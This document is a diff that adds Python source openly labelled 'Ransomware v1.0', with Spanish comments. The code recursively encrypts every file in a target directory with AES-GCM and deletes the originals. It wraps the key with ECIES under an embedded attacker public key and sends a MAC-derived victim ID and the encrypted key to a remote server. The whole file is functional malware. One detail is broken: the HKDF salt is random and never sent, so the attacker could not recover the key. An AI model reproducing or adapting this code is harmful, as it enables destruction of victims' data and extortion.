@@ -1,0 +1,112 @@
+from cryptography.hazmat.primitives import hashes, hmac
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+import os
+import hashlib
+from getmac import get_mac_address
+import base64
+import json
+
+# Ransomware v1.0
+ATTACKER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
+MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEgmBlREjfH2x3683dyOZii4olhCsr
+Hm78xilMiU5Mnp3xquB7xXp964hJBTajhk1mA+FgET6aGY7rgTMiPrSwrQ==
+-----END PUBLIC KEY-----"""
+
+ATTACKER_PUBLIC_KEY = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY_PEM)
+TARGET_DIR = r"C:\Ransomware\Files" # Cambia esta ruta al directorio que deseas encriptar
+
+def generate_aes_key():
+    return os.urandom(32)
+
+def encrypt_file(file_path, aes_key):
+    try:
+        iv = os.urandom(12)
+        cipher = Cipher(algorithms.AES(aes_key), modes.GCM(iv))
+        encryptor = cipher.encryptor()
+        
+        with open(file_path, 'rb') as f:
+            plaintext = f.read()
+        
+        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+        with open(file_path + '.enc', 'wb') as f:
+            f.write(iv + ciphertext + encryptor.tag)
+        os.remove(file_path)
+        return True
+    except (FileNotFoundError, PermissionError, IOError) as e:
+        print(f"[!] Error en la encriptacion de {file_path}: {e}")
+        return False
+
+def encrypt_aes_key_with_ecies(aes_key, attacker_public_key):
+    try:
+        ephemeral_private_key = ec.generate_private_key(ec.SECP256R1())
+        ephemeral_public_key = ephemeral_private_key.public_key()
+        
+        shared_secret = ephemeral_private_key.exchange(ec.ECDH(), attacker_public_key)
+        
+        hkdf = HKDF(
+            algorithm=hashes.SHA256(),
+            length=64,
+            salt=os.urandom(16),
+            info=b'ecies_ransomware'
+        )
+
+        derived_key = hkdf.derive(shared_secret)
+        enc_key = derived_key[:32]
+        mac_key = derived_key[32:]
+
+        iv = os.urandom(16)
+        cipher = Cipher(algorithms.AES(enc_key), modes.CTR(iv))
+        encryptor = cipher.encryptor()
+        encrypt_aes_key = encryptor.update(aes_key) + encryptor.finalize()
+
+        h = hmac.HMAC(mac_key, hashes.SHA256())
+        h.update(encrypt_aes_key)
+        mac = h.finalize()
+
+        ephemeral_public_key_bytes = ephemeral_public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        )
+
+        return iv + encrypt_aes_key + mac, ephemeral_public_key_bytes
+    
+    except Exception as e:
+        print(f"[!] Error en ECIES: {e}")
+        return None, None
+
+def ransomware(directory_path, client):
+    try:
+        victim_id = hashlib.sha256(get_mac_address().encode()).hexdigest()
+        aes_key = generate_aes_key()
+
+        encrypted_files = 0
+        for root, _, files in os.walk(directory_path):
+            for file_name in files:
+                file_path = os.path.join(root, file_name)
+                if encrypt_file(file_path, aes_key):
+                    encrypted_files += 1
+        print(f"[*] Archivos encriptados")
+
+        
+        encrypted_aes_key, ephemeral_public_key = encrypt_aes_key_with_ecies(aes_key, ATTACKER_PUBLIC_KEY)
+        if not encrypted_aes_key or not ephemeral_public_key:
+            print("[!] Fallo al encriptar la clave AES")
+            return
+        
+        #Envio del ID y las llaves al servidor en formato JSON
+        data = {
+            "victim_id": victim_id,
+            "encrypted_key": base64.b64encode(encrypted_aes_key).decode('utf-8'),
+            "ephemeral_public_key": base64.b64encode(ephemeral_public_key).decode('utf-8')
+        }
+        client.send(json.dumps(data).encode("utf-8") + b"\n")
+        print("[*] Informacion encriptada enviada al servidor")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        try:
+            client.send(f"[!] Error: {e}\n".encode("utf-8"))
+        except:
+            pass
